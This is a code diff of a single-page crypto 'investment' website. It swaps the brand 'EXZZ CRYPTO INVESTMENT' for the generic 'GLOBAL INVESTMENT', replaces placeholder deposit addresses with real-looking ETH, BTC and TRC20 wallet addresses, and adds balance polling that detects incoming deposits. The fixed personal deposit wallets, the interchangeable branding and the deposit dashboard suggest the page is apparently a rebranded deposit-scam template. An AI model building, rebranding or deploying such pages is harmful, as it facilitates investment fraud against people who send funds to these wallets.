@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>EXZZ CRYPTO INVESTMENT</title>
+  <title>GLOBAL INVESTMENT</title>
   <style>
     :root {
       --primary: #1db954;
@@ -340,7 +340,6 @@
       padding:6px;
       box-shadow:0 2px 10px #1db95433;
     }
-    /* Dashboard and contact card styles with animated effect */
     .dashboard-card, .contact-card {
       display: none;
       margin-top: 2rem;
@@ -386,7 +385,6 @@
       font-weight: bold;
       cursor: pointer;
     }
-    /* Footer styles */
     footer {
       width: 100vw;
       background: linear-gradient(90deg, #181f2b 0%, #1db954 100%);
@@ -499,14 +497,14 @@
 <body>
   <header>
     <div class="header-content">
-      <div class="logo" aria-label="EXZZ Crypto Logo">
+      <div class="logo" aria-label="GLOBAL INVESTMENT Logo">
         <svg viewBox="0 0 48 48" fill="none">
           <circle cx="24" cy="24" r="22" fill="#1db954" stroke="#fff" stroke-width="2"/>
           <path d="M24 13L34 34H14L24 13Z" fill="#fff"/>
         </svg>
       </div>
       <div>
-        <h1 class="site-title">EXZZ CRYPTO INVESTMENT</h1>
+        <h1 class="site-title">GLOBAL INVESTMENT</h1>
       </div>
     </div>
     <div class="tagline">Your Trusted Gateway to Digital Assets</div>
@@ -523,7 +521,7 @@
       <select id="tradeCrypto" aria-label="Select cryptocurrency">
         <option value="eth">Ethereum (ETH)</option>
         <option value="btc">Bitcoin (BTC)</option>
-        <option value="usdt">Tether (USDT)</option>
+        <option value="usdt">Tether (USDT TRC20)</option>
       </select>
     </div>
     <div id="walletAddressDisplay" title="Deposit Wallet Address" aria-live="polite" aria-atomic="true"></div>
@@ -535,7 +533,6 @@
     <div id="status" role="alert" aria-live="polite"></div>
   </section>
 
-  <!-- Integrated Dashboard (hidden by default) -->
   <div class="dashboard-card" id="dashboardCard">
     <h2 id="dashboardTitle">No deposit yet</h2>
     <div class="amount" id="depositedAmount"></div>
@@ -545,20 +542,18 @@
     </div>
   </div>
 
-  <!-- Contact Card (hidden by default) -->
   <div class="contact-card" id="contactCard">
     <h2>Contact Us</h2>
     <div style="margin-bottom:1.5rem;">
-      <p>Email: <a href="mailto:support@exzzcrypto.com">support@exzzcrypto.com</a></p>
-      <p>Telegram: <a href="https://t.me/exzzcrypto" target="_blank">@exzzcrypto</a></p>
-      <p>Twitter: <a href="https://twitter.com/exzzcrypto" target="_blank">@exzzcrypto</a></p>
+      <p>Email: <a href="mailto:support@globalinvestment.com">support@globalinvestment.com</a></p>
+      <p>Telegram: <a href="https://t.me/globalinvestment" target="_blank">@globalinvestment</a></p>
+      <p>Twitter: <a href="https://twitter.com/globalinvestment" target="_blank">@globalinvestment</a></p>
     </div>
     <div class="success">
       <a href="#" id="backToHomeContact">Back to Home</a>
     </div>
   </div>
 
-  <!-- Modal for deposit detection and wallet deep links -->
   <div id="modal">
     <div class="modal-content">
       <span class="close" id="closeModal">&times;</span>
@@ -579,7 +574,6 @@
     </div>
   </div>
 
-  <!-- Footer -->
   <footer>
     <div class="footer-content">
       <div class="footer-brand">
@@ -589,7 +583,7 @@
             <path d="M16 7L23 25H9L16 7Z" fill="#fff"/>
           </svg>
         </span>
-        <span class="footer-title">EXZZ CRYPTO INVESTMENT</span>
+        <span class="footer-title">GLOBAL INVESTMENT</span>
       </div>
       <div class="footer-links">
         <a href="#" id="homeLinkFooter">Home</a>
@@ -598,7 +592,7 @@
         <a href="#">Privacy</a>
       </div>
       <div class="footer-copy">
-        &copy; <span id="footerYear"></span> EXZZ Crypto Investment. All rights reserved.
+        &copy; <span id="footerYear"></span> Global Investment. All rights reserved.
       </div>
     </div>
   </footer>
@@ -607,10 +601,29 @@
   // --- CONFIGURATION ---
   const MORALIS_API_KEY = 'testApiKey';
   const depositAddresses = {
-    eth: '0x1111111111111111111111111111111111111111',
-    btc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
-    usdt: '0x2222222222222222222222222222222222222222'
+    eth: '0x1EefDEe2F15f20b44743679c1c31083BD63fE238',
+    btc: 'bc1qtuvw066pnaze0g0a3y53rcwvpe52klztk3fqwp',
+    usdt: 'TFSSHpoDtMHJmqwqZDrz64HZKnkCvgWJRS' // USDT TRC20
   };
+
+  // --- Helper: Get TRC20 USDT balance from TronGrid ---
+  async function getTrc20USDTBalance(address) {
+    // USDT TRC20 contract address on Tron
+    const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+    try {
+      const url = `https://api.trongrid.io/v1/accounts/${address}/assets/trc20`;
+      const res = await fetch(url);
+      const data = await res.json();
+      if (!data.data || !Array.isArray(data.data) || !data.data[0]) return 0;
+      const tokens = data.data[0];
+      if (tokens[usdtContract]) {
+        return Number(tokens[usdtContract]) / 1e6;
+      }
+      return 0;
+    } catch (e) {
+      return 0;
+    }
+  }
 
   // --- UI ELEMENTS ---
   const tradeCrypto = document.getElementById('tradeCrypto');
@@ -641,7 +654,11 @@
   function updateWalletAddressDisplay() {
     const selectedCrypto = tradeCrypto.value;
     const address = depositAddresses[selectedCrypto] || '';
-    walletAddressDisplay.textContent = address ? `Deposit Wallet Address: ${address}` : '';
+    let label = '';
+    if (selectedCrypto === 'btc') label = 'Bitcoin Wallet Address: ';
+    else if (selectedCrypto === 'eth') label = 'Ethereum Wallet Address: ';
+    else if (selectedCrypto === 'usdt') label = 'USDT (TRC20) Wallet Address: ';
+    walletAddressDisplay.textContent = address ? `${label}${address}` : '';
   }
   updateWalletAddressDisplay();
   tradeCrypto.addEventListener('change', updateWalletAddressDisplay);
@@ -706,10 +723,10 @@
       trustLink.href = `https://link.trustwallet.com/send?coin=60&address=${address}${amountCrypto ? '&amount=' + amountCrypto : ''}`;
       coinbaseLink.href = `ethereum:${address}${amountCrypto ? '?value=' + amountCrypto : ''}`;
     } else if (crypto === 'usdt') {
-      const contract = '0xdac17f958d2ee523a2206206994597c13d831ec7';
-      metaLink.href = `https://metamask.app.link/send/${contract}?address=${address}${amountCrypto ? '&uint256=' + (parseFloat(amountCrypto) * 1e6).toFixed(0) : ''}`;
-      trustLink.href = `https://link.trustwallet.com/send?coin=60&token=${contract}&to=${address}${amountCrypto ? '&amount=' + amountCrypto : ''}`;
-      coinbaseLink.href = `ethereum:${address}${amountCrypto ? '?value=' + amountCrypto : ''}`;
+      // USDT TRC20: Show Tronscan links
+      metaLink.href = `https://tronscan.org/#/address/${address}`;
+      trustLink.href = `https://tronscan.org/#/address/${address}`;
+      coinbaseLink.href = `https://tronscan.org/#/address/${address}`;
     } else if (crypto === 'btc') {
       metaLink.href = `bitcoin:${address}${amountCrypto ? '?amount=' + amountCrypto : ''}`;
       trustLink.href = `https://link.trustwallet.com/send?coin=0&address=${address}${amountCrypto ? '&amount=' + amountCrypto : ''}`;
@@ -762,22 +779,19 @@
 
     // Save initial balance/tx count
     let getBalance, parseAmount;
-    if (crypto === 'eth' || crypto === 'usdt') {
+    if (crypto === 'eth') {
       getBalance = async () => {
-        if (crypto === 'usdt') {
-          const url = `https://deep-index.moralis.io/api/v2.2/${walletAddress}/erc20?chain=eth`;
-          const res = await fetch(url, { headers: { "X-API-Key": MORALIS_API_KEY } });
-          const data = await res.json();
-          const usdt = data.find(t => t.symbol && t.symbol.toLowerCase() === 'usdt');
-          return usdt ? Number(usdt.balance) / (10 ** usdt.decimals) : 0;
-        } else {
-          const url = `https://deep-index.moralis.io/api/v2.2/${walletAddress}/balance?chain=eth`;
-          const res = await fetch(url, { headers: { "X-API-Key": MORALIS_API_KEY } });
-          const data = await res.json();
-          return Number(data.balance) / 1e18;
-        }
+        const url = `https://deep-index.moralis.io/api/v2.2/${walletAddress}/balance?chain=eth`;
+        const res = await fetch(url, { headers: { "X-API-Key": MORALIS_API_KEY } });
+        const data = await res.json();
+        return Number(data.balance) / 1e18;
       };
-      parseAmount = amt => amt + (crypto === 'usdt' ? " USDT" : " ETH");
+      parseAmount = amt => amt + " ETH";
+    } else if (crypto === 'usdt') {
+      getBalance = async () => {
+        return await getTrc20USDTBalance(walletAddress);
+      };
+      parseAmount = amt => amt + " USDT (TRC20)";
     } else if (crypto === 'btc') {
       getBalance = async () => {
         const url = `https://deep-index.moralis.io/api/v2.2/${walletAddress}/balance?chain=btc`;
@@ -850,7 +864,6 @@
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
-  // Footer dashboard link: always show dashboard, but only show deposit info if there is a deposit
   dashboardLinkFooter.onclick = function(e) {
     e.preventDefault();
     document.getElementById('trade').style.display = 'none';
@@ -867,7 +880,6 @@
     window.scrollTo({ top: dashboardCard.offsetTop - 50, behavior: 'smooth' });
   };
 
-  // Footer home link
   homeLinkFooter.onclick = function(e) {
     e.preventDefault();
     dashboardCard.classList.remove('active');
@@ -876,7 +888,6 @@
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
-  // Footer year
   document.getElementById('footerYear').textContent = new Date().getFullYear();
 </script>
 </body>
